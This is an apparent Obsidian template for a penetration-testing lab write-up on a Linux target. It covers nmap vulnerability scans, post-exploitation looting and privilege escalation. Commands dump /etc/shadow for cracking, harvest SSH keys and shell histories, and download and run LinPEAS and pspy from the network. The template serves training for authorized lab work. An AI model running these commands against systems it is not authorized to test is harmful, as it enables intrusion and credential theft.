#show #linux
<%*
const path = tp.file.folder(true).split('/');
const filename = "0_" + path[path.length - 1];
await tp.file.rename(filename);
tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 2] + "]]";
-%>

First flag: ☑️
Second flag: ✅
# Initial Foothold

### Software Versions

	 `searchsploit` and Google Dorks

### Insecure configurations
> Use the service template to document possible attack vectors and document here which worked
> NSE scripts: `ls /usr/share/nmap/scripts`
> Run the following for all services: `nmap --script "safe and smb-*" $hip`. If nothing helps, try `nmap --script "smb-vuln-*" $hip`


# Loot

Hostname `hostname`
	

Flag `cat /home/$(id -un)/local.txt`
	

Upgrade [[1_shells#Upgrades]]
	
##### Users
```bash
cat /etc/passwd; cat /etc/shadow; w
```
	
`unshadow passwd shadow > unshadowed.txt` 
##### Network
```bash
ip a; /sbin/route; netstat -anp; sudo iptables -S
```
	
##### Interesting files
```bash
echo -e "\n## KEYS: ##"; ls /home/*/.gpg/; ls /home/*/.ssh/; echo -e "\n## HISTORY: ##"; cat /home/*/.*_history; echo -e "\n## GIT: ##"; find / -name ".git" 2>/dev/null | cd | git config --list 2>/dev/null; echo -e "\n## MAIL: ##"; ls -alh /var/mail/
```
	
##### Home folder
```bash
ls -al /home/*/; ls -al /root/; find / -user $(id -un) -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
```
	
# PrivEsc
Find Working Dir for attack
```bash
find / -writable -type d -print -quit 2>/dev/null
```
	

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh &> linpeas.txt & less -r +F linpeas.txt
```
Read it with color-highlighting using `less -r linpeas.txt`
```bash
grep "CRON" /var/log/syslog; dpkg -l
```
Get commands run by non-accessible cronjobs and other tasks
```bash
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 && chmod +x pspy32 && timeout 30s ./pspy32 | tr -s ' ' | cut -d ' ' -f 3-4,7- | sed -e 's/$/\x1b[m/' | perl -ne 'BEGIN{$|=1}; print unless ${$_}++'
```

##### Finding 1
/root/proof.txt